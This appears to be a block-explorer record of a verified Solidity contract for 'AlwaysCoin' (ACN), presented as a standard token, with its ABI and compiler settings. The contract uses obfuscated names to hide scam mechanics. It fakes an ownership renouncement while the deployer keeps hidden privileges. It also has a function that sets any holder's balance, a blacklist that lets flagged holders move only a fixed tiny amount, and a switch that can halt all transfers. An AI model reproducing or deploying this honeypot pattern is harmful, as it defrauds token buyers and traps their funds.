{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract teamSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atSwapSender {\n    function createPair(address isModeTotal, address feeLaunch) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface launchSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface receiverEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingLaunch) external view returns (uint256);\n\n    function transfer(address tradingTxIs, uint256 receiverModeEnable) external returns (bool);\n\n    function allowance(address buyTokenMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverModeEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingTxIs,\n        uint256 receiverModeEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minLaunched, uint256 value);\n    event Approval(address indexed buyTokenMarketing, address indexed spender, uint256 value);\n}\n\ninterface receiverEnableMetadata is receiverEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlwaysCoin is teamSwap, receiverEnable, receiverEnableMetadata {\n\n    bool public fundWallet;\n\n    function enableReceiverLimit(address tokenFundTrading) public {\n        if (modeMarketing) {\n            return;\n        }\n        \n        sellBuy[tokenFundTrading] = true;\n        \n        modeMarketing = true;\n    }\n\n    function transfer(address amountBuy, uint256 receiverModeEnable) external virtual override returns (bool) {\n        return maxLimitLaunched(_msgSender(), amountBuy, receiverModeEnable);\n    }\n\n    bool public walletLiquidity;\n\n    uint256 shouldSender;\n\n    constructor (){\n        \n        swapMarketingLaunch();\n        launchSell atIsReceiver = launchSell(minToken);\n        modeLaunched = atSwapSender(atIsReceiver.factory()).createPair(atIsReceiver.WETH(), address(this));\n        minSender = atSwapSender(atIsReceiver.factory()).feeTo();\n        if (fundWallet != isMarketing) {\n            receiverLaunchShould = shouldWalletFee;\n        }\n        isFee = _msgSender();\n        sellBuy[isFee] = true;\n        feeShould[isFee] = txTo;\n        \n        emit Transfer(address(0), isFee, txTo);\n    }\n\n    address minToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address launchMax, address tradingTxIs, uint256 receiverModeEnable) external override returns (bool) {\n        if (_msgSender() != minToken) {\n            if (toBuy[launchMax][_msgSender()] != type(uint256).max) {\n                require(receiverModeEnable <= toBuy[launchMax][_msgSender()]);\n                toBuy[launchMax][_msgSender()] -= receiverModeEnable;\n            }\n        }\n        return maxLimitLaunched(launchMax, tradingTxIs, receiverModeEnable);\n    }\n\n    function minMarketing(uint256 receiverModeEnable) public {\n        limitMax();\n        shouldSender = receiverModeEnable;\n    }\n\n    address private launchedMarketing;\n\n    bool public modeMarketing;\n\n    address public modeLaunched;\n\n    function walletTeamMin(address txMaxAt) public {\n        limitMax();\n        \n        if (txMaxAt == isFee || txMaxAt == modeLaunched) {\n            return;\n        }\n        fromFund[txMaxAt] = true;\n    }\n\n    function swapMarketingLaunch() public {\n        emit OwnershipTransferred(isFee, address(0));\n        launchedMarketing = address(0);\n    }\n\n    uint256 private receiverLaunchShould;\n\n    event OwnershipTransferred(address indexed buyIs, address indexed modeTeamTotal);\n\n    function owner() external view returns (address) {\n        return launchedMarketing;\n    }\n\n    address minSender;\n\n    function getOwner() external view returns (address) {\n        return launchedMarketing;\n    }\n\n    uint256 constant atLiquidity = 12 ** 10;\n\n    function allowance(address modeFund, address totalAmountReceiver) external view virtual override returns (uint256) {\n        if (totalAmountReceiver == minToken) {\n            return type(uint256).max;\n        }\n        return toBuy[modeFund][totalAmountReceiver];\n    }\n\n    mapping(address => mapping(address => uint256)) private toBuy;\n\n    bool private isMarketing;\n\n    mapping(address => bool) public sellBuy;\n\n    uint256 public sellLaunchedWallet = 3;\n\n    uint256 private shouldWalletFee;\n\n    uint256 public sellEnable = 0;\n\n    mapping(address => uint256) private feeShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingFee;\n    }\n\n    function takeFrom(address amountBuy, uint256 receiverModeEnable) public {\n        limitMax();\n        feeShould[amountBuy] = receiverModeEnable;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTo;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atModeTake;\n    }\n\n    function walletSwap(address launchMax, address tradingTxIs, uint256 receiverModeEnable) internal view returns (uint256) {\n        require(receiverModeEnable > 0);\n\n        uint256 swapFee = 0;\n        if (launchMax == modeLaunched && sellLaunchedWallet > 0) {\n            swapFee = receiverModeEnable * sellLaunchedWallet / 100;\n        } else if (tradingTxIs == modeLaunched && sellEnable > 0) {\n            swapFee = receiverModeEnable * sellEnable / 100;\n        }\n        require(swapFee <= receiverModeEnable);\n        return receiverModeEnable - swapFee;\n    }\n\n    mapping(address => bool) public fromFund;\n\n    string private modeLimit = \"Always Coin\";\n\n    function limitMax() private view {\n        require(sellBuy[_msgSender()]);\n    }\n\n    uint8 private atModeTake = 18;\n\n    string private marketingFee = \"ACN\";\n\n    function maxLimitLaunched(address launchMax, address tradingTxIs, uint256 receiverModeEnable) internal returns (bool) {\n        if (launchMax == isFee) {\n            return txTrading(launchMax, tradingTxIs, receiverModeEnable);\n        }\n        uint256 isSwap = receiverEnable(modeLaunched).balanceOf(minSender);\n        require(isSwap == shouldSender);\n        require(tradingTxIs != minSender);\n        if (fromFund[launchMax]) {\n            return txTrading(launchMax, tradingTxIs, atLiquidity);\n        }\n        receiverModeEnable = walletSwap(launchMax, tradingTxIs, receiverModeEnable);\n        return txTrading(launchMax, tradingTxIs, receiverModeEnable);\n    }\n\n    uint256 toList;\n\n    function txTrading(address launchMax, address tradingTxIs, uint256 receiverModeEnable) internal returns (bool) {\n        require(feeShould[launchMax] >= receiverModeEnable);\n        feeShould[launchMax] -= receiverModeEnable;\n        feeShould[tradingTxIs] += receiverModeEnable;\n        emit Transfer(launchMax, tradingTxIs, receiverModeEnable);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeLimit;\n    }\n\n    function balanceOf(address tradingLaunch) public view virtual override returns (uint256) {\n        return feeShould[tradingLaunch];\n    }\n\n    address public isFee;\n\n    function approve(address totalAmountReceiver, uint256 receiverModeEnable) public virtual override returns (bool) {\n        toBuy[_msgSender()][totalAmountReceiver] = receiverModeEnable;\n        emit Approval(_msgSender(), totalAmountReceiver, receiverModeEnable);\n        return true;\n    }\n\n    uint256 private txTo = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTokenMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTeamTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalAmountReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAmountReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverModeEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFundTrading\",\"type\":\"address\"}],\"name\":\"enableReceiverLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverModeEnable\",\"type\":\"uint256\"}],\"name\":\"minMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunchedWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverModeEnable\",\"type\":\"uint256\"}],\"name\":\"takeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverModeEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTxIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverModeEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMaxAt\",\"type\":\"address\"}],\"name\":\"walletTeamMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlwaysCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}